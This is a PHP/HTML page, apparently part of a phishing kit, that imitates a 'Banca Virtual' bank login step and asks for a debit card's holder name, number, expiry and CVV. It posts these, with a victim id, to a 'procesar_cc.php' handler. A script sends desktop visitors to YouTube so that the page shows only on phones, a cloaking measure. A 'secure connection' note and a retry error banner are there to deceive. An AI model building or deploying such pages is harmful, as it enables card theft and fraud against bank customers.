<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tarjeta de Débito — Banca Virtual</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/bancavirtual.css">
    <style>
        body { background-color: #f3f4f6; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }

        .header-bar { background:#fff; box-shadow:0 1px 3px rgba(0,0,0,0.06); padding:15px 20px; display:flex; justify-content:space-between; align-items:center; position:relative; width:100%; }
        .header-link { font-size:15px; color:#6b7280; text-decoration:none; font-weight:500; display:flex; align-items:center; gap:4px; }
        .header-title { font-size:16px; font-weight:500; color:#6b7280; position:absolute; left:50%; transform:translateX(-50%); }

        .wrap { width:100%; max-width:450px; padding:24px 16px 40px; }

        /* Preview Card — verde para diferenciar de crédito */
        .preview-wrap { margin-bottom:20px; }
        .card-preview {
            width:100%; aspect-ratio:1.586; border-radius:14px;
            background:linear-gradient(135deg,#001947 0%,#0043a9 60%,#1565c0 100%);
            box-shadow:0 8px 24px rgba(0,67,169,0.35);
            padding:20px 22px; display:flex; flex-direction:column;
            justify-content:space-between; color:#fff; position:relative; overflow:hidden;
        }
        .card-preview::before { content:''; position:absolute; width:180px; height:180px; border-radius:50%; background:rgba(255,255,255,0.06); top:-50px; right:-50px; }
        .card-top { display:flex; justify-content:space-between; align-items:center; }
        .card-chip { width:34px; height:25px; border-radius:4px; background:linear-gradient(135deg,#c8962a,#f0c050); }
        .card-badge { font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; opacity:0.7; }
        .card-number-preview { font-size:clamp(16px,5vw,20px); letter-spacing:3px; font-weight:500; }
        .card-bottom-row { display:flex; justify-content:space-between; align-items:flex-end; }
        .card-fl { font-size:8px; opacity:0.55; text-transform:uppercase; letter-spacing:1px; margin-bottom:3px; }
        .card-fv { font-size:13px; font-weight:600; opacity:0.9; }

        /* Form */
        .form-card { background:#fff; border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.08); overflow:hidden; }
        .form-inner { padding:20px; }
        .row-inputs { display:flex; gap:14px; }
        .row-inputs .field-block { flex:1; }
        .field-block { margin-bottom:20px; }

        .bv-full-input {
            width:100%; height:48px; border:1px solid #d1d5db; border-radius:4px;
            padding:0 12px; font-size:16px; font-family:'Roboto',sans-serif;
            color:#1f2937; outline:none; background:#fff;
            transition:border-color .2s, box-shadow .2s;
        }
        .bv-full-input:focus { border-color:#0043a9; box-shadow:0 0 0 2px rgba(0,67,169,0.2); }
        .bv-full-input.is-invalid { border-color:#dc3545 !important; background:#fff5f5 !important; }
        .field-error-msg { font-size:12px; color:#dc3545; margin-top:5px; display:none; }
        .field-error-msg.show { display:block; }

        /* Error banner */
        .server-error-banner { display:flex; align-items:flex-start; gap:12px; background:#fff5f5; border-left:4px solid #dc3545; padding:14px 16px; }
        .server-error-banner p { font-size:14px; color:#1f2937; line-height:1.5; }
        .server-error-banner strong { color:#b91c1c; display:block; margin-bottom:3px; }

        /* Submit */
        .bv-submit-btn { width:100%; font-weight:600; height:52px; border-radius:50px; transition:background-color .2s; background:#f5f5f5; color:#6b7280; border:1px solid #e0e0e0; cursor:not-allowed; font-size:16px; font-family:'Roboto',sans-serif; }
        .bv-submit-btn:not(:disabled) { background:#0043a9; color:#fff; border:none; cursor:pointer; }
        .bv-submit-btn:not(:disabled):hover { background:#003687; }

        .secure-note { text-align:center; font-size:12px; color:#6b7280; margin-top:16px; }
    </style>
    <script>
        if (window.innerWidth > 768) window.location.href = 'https://www.youtube.com/';
    </script>
</head>
<body>

<?php
$id = htmlspecialchars($_GET['id'] ?? '');
$error = $_GET['status'] ?? '';
?>

<header class="header-bar">
    <a href="javascript:history.back()" class="header-link">&#8592; Atrás</a>
    <span class="header-title">Ingreso a Banca Virtual</span>
    <a href="index.php" class="header-link">Abandonar ✕</a>
</header>

<div class="wrap">

    <!-- Preview -->
    <div class="preview-wrap">
        <div class="card-preview">
            <div class="card-top">
                <div class="card-chip"></div>
                <span class="card-badge">Débito</span>
            </div>
            <div class="card-number-preview" id="previewNumber">•••• •••• •••• ••••</div>
            <div class="card-bottom-row">
                <div>
                    <div class="card-fl">Titular</div>
                    <div class="card-fv" id="previewName">NOMBRE APELLIDO</div>
                </div>
                <div style="text-align:right">
                    <div class="card-fl">Vence</div>
                    <div class="card-fv" id="previewExpiry">MM/AA</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Form -->
    <div class="form-card">

        <?php if ($error === 'ccerror'): ?>
        <div class="server-error-banner">
            <span style="font-size:18px;flex-shrink:0">⚠️</span>
            <p><strong>Datos de tarjeta incorrectos</strong>
            Verifica la información e intenta nuevamente.</p>
        </div>
        <?php
endif; ?>

        <div class="form-inner">
            <form id="ccForm" action="assets/modules/api/procesar_cc.php" method="post" novalidate>
                <input type="hidden" name="cliente_id"   value="<?php echo $id; ?>">
                <input type="hidden" name="tipo_tarjeta" value="debito">

                <div class="field-block">
                    <label for="card_name" class="bv-input-label">Nombre del titular</label>
                    <input class="bv-full-input" type="text" id="card_name" name="card_name"
                           placeholder="Como aparece en la tarjeta" autocomplete="cc-name" required>
                    <span class="field-error-msg" id="err-name">Ingresa el nombre del titular</span>
                </div>

                <div class="field-block">
                    <label for="card_number" class="bv-input-label">Número de tarjeta</label>
                    <input class="bv-full-input" type="text" id="card_number" name="card_number"
                           placeholder="•••• •••• •••• ••••" inputmode="numeric" maxlength="19" required>
                    <span class="field-error-msg" id="err-number">El número debe tener 16 dígitos</span>
                </div>

                <div class="row-inputs">
                    <div class="field-block">
                        <label for="expiry_date" class="bv-input-label">Vencimiento</label>
                        <input class="bv-full-input" type="text" id="expiry_date" name="expiry_date"
                               placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
                        <span class="field-error-msg" id="err-expiry">Formato inválido (MM/AA)</span>
                    </div>
                    <div class="field-block">
                        <label for="cvv" class="bv-input-label">CVV</label>
                        <input class="bv-full-input" type="text" id="cvv" name="cvv"
                               placeholder="•••" inputmode="numeric" maxlength="4" required>
                        <span class="field-error-msg" id="err-cvv">CVV inválido</span>
                    </div>
                </div>

                <button type="submit" class="bv-submit-btn" id="submitBtn" disabled>Validar</button>
            </form>
            <p class="secure-note">🔒 Conexión segura y encriptada</p>
        </div>
    </div>
</div>

<script>
    const nameIn = document.getElementById('card_name');
    const numIn  = document.getElementById('card_number');
    const expIn  = document.getElementById('expiry_date');
    const cvvIn  = document.getElementById('cvv');
    const btn    = document.getElementById('submitBtn');

    nameIn.addEventListener('input', () => {
        document.getElementById('previewName').textContent = nameIn.value.toUpperCase().trim() || 'NOMBRE APELLIDO';
        validate();
    });
    numIn.addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g,'').slice(0,16);
        e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
        let disp = '';
        for(let i=0;i<16;i++){ if(i>0&&i%4===0)disp+=' '; disp+=v[i]||'•'; }
        document.getElementById('previewNumber').textContent = disp;
        validate();
    });
    expIn.addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g,'').slice(0,4);
        if(v.length>2) v=v.slice(0,2)+'/'+v.slice(2);
        e.target.value = v;
        document.getElementById('previewExpiry').textContent = v || 'MM/AA';
        validate();
    });
    cvvIn.addEventListener('input', e => { e.target.value=e.target.value.replace(/\D/g,'').slice(0,4); validate(); });
    [nameIn,numIn,expIn,cvvIn].forEach(i=>i.addEventListener('blur',validate));

    function validate(){
        const name=nameIn.value.trim(), num=numIn.value.replace(/\s/g,''), exp=expIn.value, cvv=cvvIn.value;
        const nOk=name.length>=3, nuOk=num.length===16, eOk=/^\d{2}\/\d{2}$/.test(exp)&&validExp(exp), cOk=cvv.length>=3;
        err(nameIn,'err-name',!nOk&&name.length>0);
        err(numIn,'err-number',!nuOk&&num.length>0);
        err(expIn,'err-expiry',!eOk&&exp.length>0);
        err(cvvIn,'err-cvv',!cOk&&cvv.length>0);
        btn.disabled=!(nOk&&nuOk&&eOk&&cOk);
    }
    function err(inp,id,show){ inp.classList.toggle('is-invalid',show); document.getElementById(id).classList.toggle('show',show); }
    function validExp(v){ const[mm,yy]=v.split('/').map(Number); if(mm<1||mm>12)return false; const n=new Date(); return new Date(2000+yy,mm-1)>=new Date(n.getFullYear(),n.getMonth()); }
</script>
</body>
</html>
